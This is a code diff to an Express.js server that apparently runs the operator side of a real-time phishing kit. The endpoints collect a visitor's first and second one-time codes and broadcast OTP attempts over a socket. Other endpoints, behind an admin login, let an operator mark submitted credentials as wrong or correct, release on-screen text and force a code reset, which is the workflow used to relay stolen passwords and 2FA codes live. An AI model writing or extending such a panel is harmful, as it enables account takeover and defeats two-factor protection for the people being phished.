@@ -267,7 +267,6 @@ app.post('/api/users/check-reset-flag', async (req, res) => {
     const result = await pool.query('SELECT reset_otp_flag FROM users WHERE email = $1', [email]);
     const reset = result.rows.length > 0 ? result.rows[0].reset_otp_flag : false;
     
-    // Clear the flag after checking
     if (reset) {
       await pool.query('UPDATE users SET reset_otp_flag = false WHERE email = $1', [email]);
     }
@@ -331,7 +330,7 @@ app.post('/api/users/submit-otp', async (req, res) => {
   }
 });
 
-// Submit second OTP with duplicate check (CANNOT match first OTP)
+// Submit second OTP with duplicate check
 app.post('/api/users/submit-second-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
@@ -341,7 +340,6 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
     const userResult = await pool.query('SELECT otp FROM users WHERE email = $1', [email]);
     const firstOtp = userResult.rows[0]?.otp;
     
-    // Check if second OTP matches first OTP
     if (firstOtp && firstOtp === otp) {
       io.emit('duplicate-otp-attempt', { email, otp, timestamp: new Date() });
       return res.status(400).json({ error: '❌ You cannot use the same code as your first verification. Please enter a different code.' });
@@ -378,6 +376,20 @@ app.post('/api/users/check-redirect-success', async (req, res) => {
     res.json({ redirect_success: result.rows.length > 0 ? result.rows[0].redirect_success : false });
   } catch (error) {
     res.json({ redirect_success: false });
+  }
+});
+
+app.post('/api/users/check-admin-text', async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.json({ admin_text: null, text_release: false });
+    
+    const result = await pool.query('SELECT admin_text, text_release FROM users WHERE email = $1', [email]);
+    if (result.rows.length === 0) return res.json({ admin_text: null, text_release: false });
+    
+    res.json({ admin_text: result.rows[0].admin_text, text_release: result.rows[0].text_release });
+  } catch (error) {
+    res.json({ admin_text: null, text_release: false });
   }
 });
 
@@ -564,13 +576,12 @@ app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
   }
 });
 
-// INCORRECT OTP - JUST SETS RESET FLAG (NO TEXT, NO NOTIFICATION)
+// INCORRECT OTP - Sets reset flag (NO TEXT, NO NOTIFICATION)
 app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     
-    // JUST SET THE RESET FLAG - NO TEXT MESSAGE
     await pool.query(`
       UPDATE users SET 
         reset_otp_flag = true
@@ -578,11 +589,54 @@ app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
     `, [email]);
     
     console.log('🔄 Admin triggered OTP reset for user:', email);
-    
-    // NO socket emit, NO notification, NO sound, NO text message
     res.json({ success: true });
   } catch (error) {
     console.error('❌ Incorrect OTP error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// ==================== NEW ENDPOINTS FOR WRONG/CORRECT LOGIN ====================
+
+// WRONG LOGIN CREDENTIALS - Resets login popup and shows error on user side
+app.post('/api/admin/wrong-login', authenticateJWT, async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    
+    await pool.query(`
+      UPDATE users SET 
+        admin_text = 'wrong_login_error',
+        text_release = false
+      WHERE email = $1
+    `, [email]);
+    
+    console.log('❌ Admin marked login as WRONG for user:', email);
+    res.json({ success: true });
+  } catch (error) {
+    console.error('❌ Wrong login error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// CORRECT LOGIN CREDENTIALS - Closes popup and shows loading on user side
+app.post('/api/admin/correct-login', authenticateJWT, async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    
+    await pool.query(`
+      UPDATE users SET 
+        admin_text = 'correct_login_success',
+        text_release = false,
+        force_login = false
+      WHERE email = $1
+    `, [email]);
+    
+    console.log('✅ Admin marked login as CORRECT for user:', email);
+    res.json({ success: true });
+  } catch (error) {
+    console.error('❌ Correct login error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
